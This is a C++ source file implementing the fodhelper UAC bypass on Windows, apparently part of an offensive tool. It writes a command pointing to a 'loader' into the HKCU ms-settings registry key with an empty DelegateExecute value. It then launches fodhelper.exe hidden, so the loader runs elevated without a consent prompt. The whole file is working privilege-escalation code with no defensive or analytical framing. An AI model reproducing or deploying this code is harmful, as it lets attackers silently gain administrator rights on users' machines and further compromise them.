#include "uac_bypass.hpp"
#include <windows.h>
#include <iostream>

bool UACBypass::execute_fodhelper() {
    if (verbose) std::cout << "[*] Executing UAC bypass via fodhelper...\n";

    std::string full_command = "\"" + loader_path + "\"" + args;

    if (verbose) std::cout << "[*] Registry command: " << full_command << "\n";

    HKEY hKey;
    LONG status = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

    if (status != ERROR_SUCCESS) {
        std::cout << "[-] RegCreateKeyEx failed: " << status << "\n";
        return false;
    }

    status = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                           (BYTE*)full_command.c_str(), full_command.length() + 1);
    if (status != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::cout << "[-] RegSetValueEx failed: " << status << "\n";
        return false;
    }

    // Empty DelegateExecute = bypass
    status = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);

    if (verbose) std::cout << "[+] Registry keys created\n";

    // Launch fodhelper (runs elevated)
    HINSTANCE result = ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe",
                                     NULL, NULL, SW_HIDE);

    if ((intptr_t)result <= 32) {
        std::cout << "[-] ShellExecute failed: " << (intptr_t)result << "\n";
        return false;
    }

    if (verbose) std::cout << "[+] fodhelper.exe launched (elevated)\n";
    return true;
}
